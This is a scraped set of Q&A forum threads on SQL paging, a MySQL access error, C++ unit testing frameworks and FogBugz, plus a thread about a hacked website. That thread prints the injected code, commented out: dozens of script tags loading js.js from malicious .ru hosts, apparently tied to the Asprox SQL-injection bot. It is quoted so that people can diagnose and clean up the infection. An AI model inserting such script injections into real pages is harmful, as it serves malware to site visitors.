</code></pre>

<p>etc</p>
 <p>I believe you'd need to perform a separate query to accomplish that unfortionately.</p>

<p>I was able to accomplish this at my previous position using some help from this page:
<a href=""http://aspnet.4guysfromrolla.com/articles/031506-1.aspx"" rel=""nofollow"">Paging in DotNet 2.0</a></p>

<p>They also have it pulling a row count seperately.</p> <p>Here's what I do for paging:  All of my big queries that need to be paged are coded as inserts into a temp table.  The temp table has an identity field that will act in a similar manner to the row_number() mentioned above.  I store the number of rows in the temp table in an output parameter so the calling code knows how many total records there are.  The calling code also specifies which page it wants, and how many rows per page, which are selected out from the temp table.</p>

<p>The cool thing about doing it this way is that I also have an ""Export"" link that allows you to get all rows from the report returned as CSV above every grid in my application.  This link uses the same stored procedure: you just return the contents of the temp table instead of doing the paging logic.  This placates users who hate paging, and want to see <em>everything</em>, and want to sort it in a million different ways.</p>
 <p>If you're trying to get it in one statement (the total plus the paging).  You might need to explore SQL Server support for the partition by clause (windowing functions in ANSI SQL terms).  In Oracle the syntax is just like the example above using row_number(), but I have also added a partition by clause to get the total number of rows included with each row returned in the paging (total rows is 1,262):</p>

<pre><code>SELECT rn, total_rows, x.OWNER, x.object_name, x.object_type
  FROM (SELECT COUNT (*) OVER (PARTITION BY owner) AS TOTAL_ROWS,
               ROW_NUMBER () OVER (ORDER BY 1) AS rn, uo.*
          FROM all_objects uo
         WHERE owner = 'CSEIS') x
 WHERE rn BETWEEN 6 AND 10
</code></pre>

<p>Note that I have where owner = 'CSEIS' and my partition by is on owner.  So the results are:</p>

<pre><code>RN  TOTAL_ROWS  OWNER   OBJECT_NAME OBJECT_TYPE
6   1262    CSEIS   CG$BDS_MODIFICATION_TYPES   TRIGGER
7   1262    CSEIS   CG$AUS_MODIFICATION_TYPES   TRIGGER
8   1262    CSEIS   CG$BDR_MODIFICATION_TYPES   TRIGGER
9   1262    CSEIS   CG$ADS_MODIFICATION_TYPES   TRIGGER
10  1262    CSEIS   CG$BIS_LANGUAGES    TRIGGER
</code></pre>
 <p>When I need to do paging, I typically use a temporary table as well.  You can use an output parameter to return the total number of records.  The case statements in the select allow you to sort the data on specific columns without needing to resort to dynamic SQL.</p>

<pre><code>--Declaration--

--Variables
@StartIndex INT,
@PageSize INT,
@SortColumn VARCHAR(50),
@SortDirection CHAR(3),
@Results INT OUTPUT

--Statements--
SELECT @Results = COUNT(ID) FROM Customers
WHERE FirstName LIKE '%a%'

SET @StartIndex = @StartIndex - 1 --Either do this here or in code, but be consistent
CREATE TABLE #Page(ROW INT IDENTITY(1,1) NOT NULL, id INT, sorting_1 SQL_VARIANT, sorting_2 SQL_VARIANT)
INSERT INTO #Page(ID, sorting_1, sorting_2)
SELECT TOP (@StartIndex + @PageSize)
    ID,
    CASE
    	WHEN @SortColumn='FirstName' AND @SortDirection='ASC' THEN CAST(FirstName AS SQL_VARIANT)
    	WHEN @SortColumn='LastName' AND @SortDirection='ASC' THEN CAST(LastName AS SQL_VARIANT)
    	ELSE NULL
    END AS sort_1,
    CASE
    	WHEN @SortColumn='FirstName' AND @SortDirection='DES' THEN CAST(FirstName AS SQL_VARIANT)
    	WHEN @SortColumn='LastName' AND @SortDirection='DES' THEN CAST(LastName AS SQL_VARIANT)
    	ELSE NULL
    END AS sort_2
FROM (
    SELECT
    	CustomerId AS ID,
    	FirstName,
    	LastName
    FROM Customers
    WHERE
    	FirstName LIKE '%a%'
) C
ORDER BY sort_1 ASC, sort_2 DESC, ID ASC;

SELECT
    ID,
    Customers.FirstName,
    Customers.LastName
FROM #Page
INNER JOIN Customers ON
    ID = Customers.CustomerId
WHERE ROW &gt; @StartIndex AND ROW &lt;= (@StartIndex + @PageSize)
ORDER BY ROW ASC

DROP TABLE #Page
</code></pre>
 <p>The accepted answer for this doesn't actually work for me...I had to jump through one more hoop to get it to work.</p>

<p>When I tried the answer</p>

<pre><code>SELECT Row_Number() OVER(ORDER BY UserName) As RowID, UserFirstName, UserLastName
FROM Users
WHERE RowID Between 0 AND 9
</code></pre>

<p>it failed, complaining that it didn't know what RowID was.</p>

<p>I had to wrap it in an inner select like this:</p>

<pre><code>SELECT * 
FROM
    (SELECT
    Row_Number() OVER(ORDER BY UserName) As RowID, UserFirstName, UserLastName
    FROM Users
    ) innerSelect
WHERE RowID Between 0 AND 9
</code></pre>

<p>and then it worked.</p>
"
"MySQL/Apache Error in PHP MySQL query <p>I am getting the following error:</p>

<blockquote>
  <p>Access denied for user 'apache'@'localhost' (using password: NO)</p>
</blockquote>

<p>When using the following code:</p>

<pre><code>&lt;?php

include(""../includes/connect.php"");

$query = ""SELECT * from story"";

$result = mysql_query($query) or die(mysql_error());

echo ""&lt;h1&gt;Delete Story&lt;/h1&gt;"";

if (mysql_num_rows($result) &gt; 0) {
    while($row = mysql_fetch_row($result)){
          echo '&lt;b&gt;'.$row[1].'&lt;/b&gt;&lt;span align=""right""&gt;&lt;a href=""../process/delete_story.php?id='.$row[0].'""&gt;Delete&lt;/a&gt;&lt;/span&gt;';
      echo '&lt;br /&gt;&lt;i&gt;'.$row[2].'&lt;/i&gt;';
    }
}
else {
   echo ""No stories available."";
}
?&gt;
</code></pre>

<p>The connect.php file contains my MySQL connect calls that are working fine with my INSERT queries in another portion of the software.  If I comment out the $result = mysql_query line, then it goes through to the else statement.  So, it is that line or the content in the if.</p>

<p>I have been searching the net for any solutions, and most seem to be related to too many MySQL connections or that the user I am logging into MySQL as does not have permission.  I have checked both.  I can still perform my other queries elsewhere in the software, and I have verified that the account has the correct permissions.</p>
 <p>Just to check, if you use <strong>just</strong> this part you get an error?</p>

<pre><code>&lt;?php
include(""../includes/connect.php"");

$query = ""SELECT * from story"";
$result = mysql_query($query) or die(mysql_error());
</code></pre>

<p>If so, do you still get an error if you copy and paste one of those Inserts into this page, I am trying to see if it's local to the page or that actual line.</p>

<p>Also, can you post a copy of the connection calls (minus passwords), unless the inserts use exactly the same syntax as this example.</p>
 <p>Does the apache user require a password to connect to the database?  If so, then the fact that it says ""using password: NO"" would lead me to believe that the code is trying to connect without a password.</p>

<p>If, however, the apache user doesn't require a password, a double-check of the permissions may be a good idea (which you mentioned you already checked).  It may still be beneficial to try executing something like this at a mysql prompt:</p>

<blockquote>
  <p><code>GRANT ALL PRIVILEGES ON</code> <em>databasename</em><code>.* to 'apache'@'localhost';</code></p>
</blockquote>

<p>That syntax should be correct.  </p>

<p>Other than that, I'm just as stumped as you are.</p> <p>If indeed you are able to insert using the same connection calls, your problem most likely lies in the user ""apache"" not having SELECT permissions on the database. If you have phpMyAdmin installed you can look at the permissions for the user in the Privileges pane. phpMyAdmin also makes it very easy to modify the permissions.</p>

<p>If you only have access to the command line, you can check the permissions from the mysql database.</p>

<p>You'll probably need to do something like: </p>

<p>GRANT SELECT ON myDatabase.myTable TO 'apache'@'localhost';</p> <blockquote>
  <p>Just to check, if you use just this part you get an error?</p>
  
  <p>If so, do you still get an error if you copy and paste one of those Inserts into this >page, I am trying to see if it's local to the page or that actual line.</p>
  
  <p>Also, can you post a copy of the connection calls (minus passwords), unless the inserts >use exactly the same syntax as this example.</p>
</blockquote>

<p>Here is what is in the connection.php file.  I linked to the file through an include in the same fashion as where I execute the INSERT queries elsewhere in the code.</p>

<pre><code>$conn = mysql_connect(""localhost"", ******, ******) or die(""Could not connect"");
mysql_select_db(""adbay_com_-_cms"") or die(""Could not select database"");
</code></pre>

<p>I will try the working INSERT query in this area to check that out.</p>

<p>As to the others posting about the password access.  I did, as stated in my first posting, check permissions.  I used phpMyAdmin to verify that the permissions for the user account I was using were correct.  And if it matters at all, apache@localhost is not the name of the user account that I use to get into the database.  I don't have any user accounts with the name apache in them at all for that matter.</p>
 <blockquote>
  <p>And if it matters at all, apache@localhost is not the name of the user account that I use to get into the database. I don't have any user accounts with the name apache in them at all for that matter.</p>
</blockquote>

<p>If it is saying 'apache@localhost' the username is not getting passed correctly to the MySQL connection. 'apache' is normally the user that runs the httpd process (at least on Redhat-based systems) and if no username is passed during the connection MySQL uses whomever is calling for the connection.</p>

<p>If you do the connection right in your script, not in a called file, do you get the same error?</p> <p>Don't forget to check your database error logs. You should be able to see if you are even hitting the DB. If you aren't, you should check your firewall rules on the box. On a linux box you can run iptables -L to get the firewall list rules. </p>

<p>Otherwise it will be a pure access issue. Do a ""select * from mysql.user"" to see if the apache user is even set up in there. Further, I would recommend creating an account specifically for your app as opposed to using apache, since any other app you create will run as apache by default, and could get unauthorized access to your db. </p>

<p>Just look up ""GRANT"" in the documentation @ dev.mysql.com to get more info. If you have more specific questiosn regarding db, just edit your question, and i will take a look.</p>
 <p>Does the connect.php script actually make the connection or does it just define a function you need to call to create a connection? The error you're getting is symptomatic of not having a previously established connection at all.</p>

<p>ETA: Also change the include to a require. I suspect it's not actually including the file at all. But include can fail silently.</p>
 <p>Change the include() to require(). <strong>If the ""connect.php"" file can't be require()d, the script will fail</strong> with a fatal error, whereas <strong>include() only generates a warning</strong>. If the username you're passing to mysql_connect() isn't ""apache"", an incorrect path to the connect script is the most common way to get this type of error.</p>
 <p>Dude the answer is a big DUH! which unfortunately it took me a while to figure out as well. You probably have a function like dbconnect() and you are using variables from an include file to make the connection. $conn = mysql_connect($dbhost, $dbuser, $dbpass).</p>

<p>Well since this is inside a function the variables from the include file need to be passed to the function or else the function will not know what $dbhost, $dbuser and $dbpass is. A way to fix this is to make those variables global so your functions can pick them up. Another solution which is not very secure would be to write out you host, user and pass in the mysql_connect function.</p>

<p>Hope this helps but I had the same problem.</p>
 <p>You can do one of the following:</p>

<ul>
<li>Add the user ""apache"" and setup its privileges from phpmyadmin or using mysql on a shell</li>
<li>Tell php to run <code>mysql_connect</code> as another user, someone who already has the privileges needed (but maybe not root), look for mysql.default_user in your php.ini file.</li>
</ul>
 <p>Did you remember to do:</p>

<pre><code>flush privileges;
</code></pre>

<p>If the user is not set up then it will give the 'apache'@'localhost' error.</p>
"
"My website got hacked... What should I do? <p>My dad called me today and said people going to his website were getting 168 viruses trying to download to their computers. He isn't technical at all, and built the whole thing with a WYSIWYG editor.</p>

<p>I popped his site open and viewed the source, and there was a line of Javascript includes at the bottom of the source right before the closing HTML tag. They included this file (among many others): <a href=""http://www.98hs.ru/js.js"" rel=""nofollow"">http://www.98hs.ru/js.js</a> &lt;-- TURN OFF JAVASCRIPT BEFORE YOU GO TO THAT URL.</p>

<p>So I commented it out for now. It turns out his ftp password was a plain dictionary word six letters long, so we think that's how it got hacked. We've changed his password to an 8+ digit non-word string (he wouldn't go for a passphrase since he is a hunt-n-peck typer).</p>

<p>I did a <a href=""http://whois.domaintools.com/98hs.ru"" rel=""nofollow"">whois on 98hs.ru</a> and found it is hosted from a server in Chile. There is actually an e-mail address associated with it too, but I seriously doubt this person is the culprit. Probably just some other site that got hacked...</p>

<p>I have no idea what to do at this point though as I've never dealt with this sort of thing before. Anyone have any suggestions?</p>

<p>He was using plain jane un-secured ftp through webhost4life.com. I don't even see a way to <em>do</em> sftp on their site. I'm thinking his username and password got intercepted?</p>

<p><strong>So, to make this more relevant to the community, what are the steps you should take/best practices you should follow to protect your website from getting hacked?</strong></p>

<p>For the record, here is the line of code that ""magically"" got added to his file (and isn't in his file on his computer -- I've left it commented out just to make absolute sure it won't do anything on this page, although I'm sure Jeff would guard against this):</p>

<pre><code>&lt;!--script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script--&gt;
</code></pre>
 <p>With a six word character password, he may have been brute forced.  That is more likely than his ftp being intercepted, but it could be that too.</p>

<p>Start with a stronger password. (8 characters is still fairly weak)</p>

<p>See if this link to an internet <a href=""http://blog.modsecurity.org/2008/01/is-your-website.html"" rel=""nofollow"">security blog</a> is helpful.</p> <p>Try and gather as much information as you can. See if the host can give you a log showing all the FTP connections that were made to your account. You can use those to see if it was even an FTP connection that was used to make the change and possibly get an IP address.</p>

<p>If you're using a prepacked software like Wordpress, Drupal, or anything else that you didn't code there may be vulnerabilities in upload code that allows for this sort of modification. If it is custom built, double check any places where you allow users to upload files or modify existing files.</p>

<p>The second thing would be to take a dump of the site as-is and check everything for other modifications. It may just be one single modification they made, but if they got in via FTP who knows what else is up there.</p>

<p>Revert your site back to a known good status and, if need be, upgrade to the latest version.</p>

<p>There is a level of return you have to take into account too. Is the damage worth trying to track the person down or is this something where you just live and learn and use stronger passwords?</p> <P>Is the site just plain static HTML? i.e. he hasn't managed to code himself an upload page that permits anyone driving by to upload compromised scripts/pages?</P>
<P>Why not ask webhost4life if they have any FTP logs available and report the issue to them. You never know, they may be quite receptive and find out for you exactly what happened? </P>
<P>I work for a shared hoster and we always welcome reports such as these and can usually pinpoint the exact vector of attack based and advise as to where the customer went wrong.</P> <p>You mention your Dad was using a website publishing tool.</p>

<p>If the publishing tool publishes from his computer to the server, it may be the case that his local files are clean, and that he just needs to republish to the server.</p>

<p>He should see if there's a different login method to his server than plain FTP, though... that's not very secure because it sends his password as clear-text over the internet.</p> <p>I know this is a little late in the game, but the URL mentioned for the JavaScript is mentioned in a list of sites known to have been part of the ASPRox bot resurgence that started up in June (at least that's when we were getting flagged with it). Some details about it are mentioned below:</p>

<p><a href=""http://www.bloombit.com/Articles/2008/05/ASCII-Encoded-Binary-String-Automated-SQL-Injection.aspx"" rel=""nofollow"">http://www.bloombit.com/Articles/2008/05/ASCII-Encoded-Binary-String-Automated-SQL-Injection.aspx</a> </p>

<p>The nasty thing about this is that effectively every varchar type field in the database is ""infected"" to spit out a reference to this URL, in which the the browser gets an tiny iframe that turns it into a bot. A basic SQL fix for this can be found here:</p>

<p><a href=""http://aspadvice.com/blogs/programming_shorts/archive/2008/06/27/Asprox-Recovery.aspx"" rel=""nofollow"">http://aspadvice.com/blogs/programming_shorts/archive/2008/06/27/Asprox-Recovery.aspx</a></p>

<p>The scary thing though is that the virus looks to the system tables for values to infect and a lot of shared hosting plans also share the database space for their clients. So most likely it wasn't even your dad's site that was infected, but somebody else's site within his hosting cluster that wrote some poor code and opened the door to SQL Injection attack.</p>

<p>If he hasn't done so yet, I'd send an URGENT e-mail to their host and give them a link to that SQL code to fix the entire system. You can fix your own affected database tables, but most likely the bots that are doing the infection are going to pass right through that hole again and infect the whole lot.</p>

<p>Hopefully this gives you some more info to work with.</p>

<p>EDIT: One more quick thought, if he's using one of the hosts online design tools for building his website, all of that content is probably sitting in a column and was infected that way.</p> <p>We had been hacked from same guys apparently! Or bots, in our case. They used SQL injection in URL on some old classic ASP sites that nobody maintain anymore. We found attacking IPs and blocked them in IIS. Now we must refactor all old ASP.
So, my advice is to take a look at IIS logs first, to find if problem is in your site's code or server configuration.</p>
 <p>Unplug the webserver without shutting it down to avoid shutdown scripts. Analyze the hard disk through another computer as a data drive and see if you can determine the culprit through log files and things of that nature. Verify that the code is safe and then restore it from a backup.</p>
 <p>This happened to a client of mine recently that was hosted on ipower.  I'm not sure if your hosting environment was Apache based, but if it was be sure to double check for .htaccess files that you did not create, particularly above the webroot and inside of image directories, as they tend to inject some nastiness there as well (they were redirecting people depending on where they came from in the refer).  Also check any that you did create for code that you did not write.</p>
 <p>I have written a server side code removal tool in ASP.Net <a href=""http://faiz.kera.la/2009/04/12/server-side-code-cleaner-in-aspnet-for-iframe-injection-attack/"" rel=""nofollow"">Here</a>. Hope this will help you save your time to clean the hosted files :) This is much faster than cleaning the files via FTP or your control panel.</p>
"
"How to set up unit testing for Visual Studio C++ <p>I'm having trouble figuring out how to get the testing framework set up and usable in Visual Studio 2008 for C++ presumably with the built-in unit testing suite.</p>

<p>Any links or tutorials would be appreciated.</p>
 <p>I use <a href=""https://github.com/unittest-cpp"" rel=""nofollow"">UnitTest++</a>.</p>

<p>In the years since I made this post the source has moved from SourceForge to github.  Also the <a href=""https://github.com/unittest-cpp/unittest-cpp/wiki/Writing-More-Tests-With-the-Bowling-Game-Kata"" rel=""nofollow"">example tutorial</a> is now more agnostic - doesn't go into any configuration or project set up at all.</p>

<p>I doubt it will still work for Visual Studio 6 as the project files are now created via CMake. If you still need the older version support you can get the last available version under the <a href=""https://github.com/unittest-cpp/unittest-cpp/tree/sourceforge"" rel=""nofollow"">SourceForge</a> branch.</p>
 <p>I've used <a href=""http://cppunit.sourceforge.net/cppunit-wiki"" rel=""nofollow"">CppUnit</a> with VS2005 and Eclipse. The wiki is very thorough (especially if you are familiar with JUnit).</p>
 <p>I'm not 100% sure about VS2008, but I know that the Unit Testing framework that microsoft shipped in VS2005 as part of their Team Suite was only for .NET, not C++</p>

<p>I've used CppUnit also and it was alright. Much the same as NUnit/JUnit/so on.</p>

<p>If you've used boost, they <a href=""http://www.boost.org/doc/libs/1_35_0/libs/test/doc/index.html"" rel=""nofollow"">also have a unit testing library</a></p>

<p>The guys behind boost have some <strong>serious</strong> coding chops, so I'd say their framework should be pretty good, but it might not be the most user friendly :-)</p>
 <p>The framework included with VS9 <em>is</em> .NET, but you can write tests in C++/CLI, so as long as you're comfortable learning some .NET isms, you should be able to test most any C++ code.</p>

<p><a href=""http://www.boost.org/doc/libs/1_35_0/libs/test/doc/"" rel=""nofollow"">boost.test</a>
 and <a href=""http://code.google.com/p/googletest/"" rel=""nofollow"">googletest</a>
look to be fairly similar, but adapted for slightly different uses. Both of these have a binary component, so you'll need an extra project in your solution to compile and run the tests.</p>

<p>The framework we use is <a href=""http://cxxtest.sourceforge.net/"" rel=""nofollow"">CxxTest</a>, which is much lighter; it's headers only, and uses a Perl (!) script to scrape test suite information from your headers (suites inherit from CxxTest::Base, all your test methods' names start with ""test""). Obviously, this requires that you get Perl from <a href=""http://www.activestate.com/Products/activeperl/index.mhtml"" rel=""nofollow"">one source</a> or <a href=""http://www.cygwin.com/"" rel=""nofollow"">another</a>, which adds overhead to your build environment setup.</p>
 <p>The unit tester for VS2008 is only for .NET code as far as I know.</p>

<p>I used CppUnit on Vs2005 and found it to be pretty good. </p>

<p>As far as I remember, the setup was relatively painless, just make sure that in your testing projects the linker (Linker->Input->Additional Dependencies) includes cppunitd.lib. </p>

<p>Then, <code>#include &lt;cppunit/extensions/HelperMacros.h&gt;</code> in your header</p>

<p>You can then follow the steps in <a href=""http://cppunit.sourceforge.net/doc/1.11.6/cppunit_cookbook.html"" rel=""nofollow"">http://cppunit.sourceforge.net/doc/1.11.6/cppunit_cookbook.html</a> to get your test class working.</p>
 <p>I like the CxxTest as well for the same reasons. It's a header file only so no linking required. You aren't stuck with Perl as there is a Python runner as well. I will be reviewing the google library soon. The Boost stuff pulls in too much other baggage. </p>
 <p><a href=""http://gamesfromwithin.com/exploring-the-c-unit-testing-framework-jungle"" rel=""nofollow"">This page</a> may help, it reviews quite a few C++ unit test frameworks:</p>

<ul>
<li>CppUnit  </li>
<li>Boost.Test</li>
<li>CppUnitLite </li>
<li>NanoCppUnit</li>
<li>Unit++</li>
<li>CxxTest</li>
</ul>

<p>Check out <strong><em><a href=""http://www.objectmentor.com/resources/downloads.html"" rel=""nofollow"">CPPUnitLite</a></em></strong> or <strong><em><a href=""http://gamesfromwithin.com/?p=48"" rel=""nofollow"">CPPUnitLite2</a></em></strong>. </p>

<p><em>CPPUnitLite</em> was created by Michael Feathers, who originally ported Java's JUnit to C++ as CPPUnit (CPPUnit tries mimic the development model of JUnit - but C++ lacks Java's features [e.g. reflection] to make it easy to use). </p>

<p>CPPUnitLite attempts to make a true C++-style testing framework, not a Java one ported to C++. (I'm paraphrasing from Feather's <a href=""http://rads.stackoverflow.com/amzn/click/0131177052"" rel=""nofollow"">Working Effectively with Legacy Code</a> book). <em>CPPUnitLite2</em> seems to be another rewrite, with more features and bug fixes.</p>

<p>I also just stumbled across <strong><em><a href=""http://sourceforge.net/projects/unittest-cpp/"" rel=""nofollow"">UnitTest++</a></em></strong> which includes stuff from CPPUnitLite2 and some other framework.</p>

<p>Microsoft has released <strong><em><a href=""http://winunit.codeplex.com/"" rel=""nofollow"">WinUnit</a></em></strong>. </p>

<p>Also checkout <strong><em><a href=""https://github.com/philsquared/Catch"" rel=""nofollow"">Catch</a></em></strong> or <strong><em><a href=""https://github.com/onqtam/doctest"" rel=""nofollow"">Doctest</a></em></strong></p>
 <p>Personally, I prefer <a href=""http://msdn.microsoft.com/en-us/magazine/cc136757.aspx"">WinUnit</a> since it doesn't require me to <a href=""http://www.wintellect.com/cs/blogs/jrobbins/archive/2008/01/17/winunit-an-outstanding-native-c-unit-testing-tool.aspx"">write anything except for my tests</a> (I build a .dll as the test, not an exe).  I just build a project, and point WinUnit.exe to my test output directory and it runs everything it finds.  You can <a href=""http://download.microsoft.com/download/f/2/7/f279e71e-efb0-4155-873d-5554a0608523/MSDNMag2008_02.exe"">download the WinUnit project here</a>. (MSDN now requires you to download the entire issue, not the article.  WinUnit is included within.)</p>
 <p><strong>There is a way to test unmanaged C++ using the built in testing framework within Visual Studio 2008</strong>. If you create a C++ Test Project, using C++/CLI, you can then make calls to an unmanaged DLL. You will have to switch the Common Language Runtime support to /clr from /clr:safe if you want to test code that was written in unmanaged C++.</p>

<p>I have step by step details on my blog here: <a href=""http://msujaws.wordpress.com/2009/05/06/unit-testing-mfc-with-mstest/"">http://msujaws.wordpress.com/2009/05/06/unit-testing-mfc-with-mstest/</a></p>
 <p>The tools that have been mentioned here are all command line tools. If you look for a more integrated solution, have a look at <a href=""http://www.cfix-studio.com/"" rel=""nofollow"">cfix studio</a>, which is a Visual Studio AddIn for C/C++ unit testing . It is quite similar to TestDriven.Net, but for (unmanaged) C/C++ rather than .Net. </p>
 <p>Here is the approach I use to test the IIS URL Rewrite module at Microsoft (it is command-line based, but should work for VS too):</p>

<ol>
<li>Make sure your header files are consumable by moving source code to cpp files and using forward declaration if needed.</li>
<li>Compile your code to test as library (.lib)</li>
<li>Create your UnitTest project as C++ with CLR support.</li>
<li>Include your header files.</li>
<li>Include your .lib files.</li>
<li>Add a reference to Microsoft.VisualStudio.QualityTools.UnitTestFramework.dll</li>
<li>Use a really small class for declaring your unit test and jump from managed to C++/Native code like this (may have typos):</li>
</ol>

<p>Here is an example:</p>

<pre><code>// Example
#include ""stdafx.h""
#include ""mstest.h""

// Following code is native code.
#pragma unmanaged
void AddTwoNumbersTest() {
  // Arrange
  Adder yourNativeObject;
  int expected = 3;
  int actual;
  // Act
  actual = yourNativeObject.Add(1, 2);
  // Assert
  Assert::AreEqual(expected, actual, L""1 + 2 != 3"");
}

// Following code is C++/CLI (Managed)
#pragma managed
using namespace Microsoft::VisualStudio::TestTools::UnitTesting;
[TestClass]
public ref class TestShim {
public:
  [TestMethod]
  void AddTwoNumbersTest() {
     // Just jump to C++ native code (above)
     ::AddTwoNumbersTest();
  }
};
</code></pre>

<p>With this approach, people don't have to learn too much C++/CLI stuff, all the real test will be done in C++ native and the TestShim class will be used to 'publish' the test to MSTest.exe (or make it visible).</p>

<p>For adding new tests you just declare a new [TestMethod] void NewTest(){::NewTest();} method and a new void NewTest() native function. No macros, no tricks, straighforward.</p>

<p>Now, the  heade file is optionally, but it can be used to expose the Assert class' methods with C++ native signatures (e.g. wchar_t* instead of Stirng^), so it can you can keep it close to C++ and far from C++/CLI:</p>

<p>Here is an example:</p>

<pre><code>// Example
#pragma once
#pragma managed(push, on)
using namespace System;
class Assert {
public:
    static void AreEqual(int expected, int actual) {
        Microsoft::VisualStudio::TestTools::UnitTesting::Assert::AreEqual(expected, actual);
    }

    static void AreEqual(int expected, int actual, PCWSTR pszMessage) {
        Microsoft::VisualStudio::TestTools::UnitTesting::Assert::AreEqual(expected, actual, gcnew String(pszMe
ssage));
    }

    template&lt;typename T&gt;
    static void AreEqual(T expected, T actual) {
        Microsoft::VisualStudio::TestTools::UnitTesting::Assert::AreEqual(expected, actual);
    }

    // Etcetera, other overloads...
}
#pragma managed(pop)
</code></pre>

<p>HTH</p>
 <p>I was suffering to implement unit test for unmanaged C++ application in windows environment with Visual Studio. So I manage to overcome and wrote a post as a step by step guidance to unmanaged C++ Application Unit Test. Hope It may help you.</p>

<p><a href=""http://codeketchup.blogspot.sg/2012/12/unit-test-for-unmanaged-c-in-visual.html"" rel=""nofollow"">http://codeketchup.blogspot.sg/2012/12/unit-test-for-unmanaged-c-in-visual.html</a> </p>
"
"Anyone soloing using fogbugz? <p>Is there anyone working solo and using fogbugz out there? I'm interested in personal experience/overhead versus paper.</p>

<p>I am involved in several projects and get pretty hammered with lots of details to keep track of... Any experience welcome.</p>

